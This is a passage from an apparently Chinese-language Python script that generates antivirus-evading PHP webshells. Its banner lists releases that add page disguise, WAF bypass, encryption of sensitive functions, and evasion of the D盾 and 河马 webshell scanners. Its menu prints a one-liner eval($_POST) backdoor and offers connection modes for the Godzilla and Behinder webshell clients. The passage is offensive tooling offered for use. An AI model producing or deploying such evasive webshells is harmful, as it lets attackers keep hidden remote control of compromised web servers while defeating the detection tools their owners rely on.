                    path1 = path[0]
                    if path1 == '/':
                        xt = 'linux'
                    else:
                        xt = 'windows'
                    print(f"""
                |---------------------------------------
                |{colored('php_弱鸡_webshelll免杀生成_5.0', 'red')}
                |哥斯拉_php的一句话，连接方式有三个，其中两个不支持伪造
                |PHP_EVAL_XOR_BASE64支持
                |冰蝎PHP_default_xor_base64和PHP_default_aes支持
                |不支持PHP_aes_with_magic
                |---------------------------------------
                |by 弱鸡
                |版本1.0: 加入了显示页面伪装
                |版本2.0: 加入了自定义文件名以及错误处理
                |        添加了过某些waf
                |版本3.0: 对一些敏感函数加密
                |版本4.0: 修复了使用错误
                |        4.1: 修改了报错问题
                |        4.2: 绕过d盾牌检测
                |        4.3: 绕过河马检测，并添加了严格的密码验证
                |        4.4：修复了代码逻辑问题，并添加了@，防止报错
                |版本5.0: 添加了哥斯拉和冰蝎的免杀       
                |---------------------------------------
                |配置信息
                |默认生成shell文件路径：{path}
                |time：{current_time}
                |系统：{xt}
                |-------------------------------------------
                    """)
                    # {colored('冰蝎4.0.5_php_default_xor_base64', 'red')}
                    print((f"""请选择生成webshell类型的连接方式:
                              (a)正常一句话(哥斯拉eval_xor_base64，蚁剑也可以使用){colored("<?php @eval($_POST['随机生成']);?> ", 'red')}
                              (b)哥斯拉{colored('PHP_XOR_BASE64 ', 'red')}
                              (c)哥斯拉{colored('PHP_XOR_RAW', 'red')}
                              (d)冰蝎4.0.5{colored('PHP_default_aes', 'red')}
                              (e)冰蝎4.0.5{colored('PHP_aes_with_magic', 'red')}
                              (f)冰蝎4.0.5{colored('PHP_default_xor_base64', 'red')}
                              """))
                    jiami = input("：")
                if jiami == 'a' or jiami == 'A':
                    Lj(php_name=php, jiami=jiami)
                elif jiami == 'b' or jiami == 'B':
                    Lj(php_name=php, jiami=jiami)
                elif jiami == 'c' or jiami == 'C':
                    Lj(php_name=php, jiami=jiami)
                elif jiami == 'd' or jiami == 'D':
                    Lj(php_name=php, jiami=jiami)
                elif jiami == 'e' or jiami == 'E':
                    Lj(php_name=php, jiami=jiami)
                elif jiami == 'f' or jiami == 'F':
                    Lj(php_name=php, jiami=jiami)
                else:
                    print("输入错误，将使用(a)")
                    jiami = 'a'
                    Lj(php_name=php, jiami=jiami)

            if jsp != None:
                print(colored('\njsp免杀_还在编写中', 'red'))
        else:
            name = os.path.basename(__file__)
            os.system(f'python {name} -h')

except KeyboardInterrupt as error:
    print(colored(f'\n------------------------------------------', 'red'),'{',colored("程序终止", "green"),'}',colored(f'------------------------------------------', 'red'))
